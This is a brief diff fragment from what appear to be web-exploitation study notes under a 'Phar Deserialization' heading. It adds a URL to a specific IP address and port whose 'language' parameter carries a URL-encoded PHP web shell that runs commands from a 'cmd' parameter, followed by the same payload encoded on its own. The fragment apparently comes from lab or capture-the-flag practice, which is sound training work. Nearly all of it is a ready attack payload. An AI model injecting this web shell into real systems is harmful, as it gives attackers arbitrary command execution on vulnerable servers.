@@ -102,7 +102,10 @@ tab: **Phar Deserialization**
 
 ---
 
-
+```
+http://154.57.164.74:31158/index.php?language=%3C%3Fphp%20system(%24_GET[%22cmd%22])%3B%3F%3E
+%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
 
 ---
 
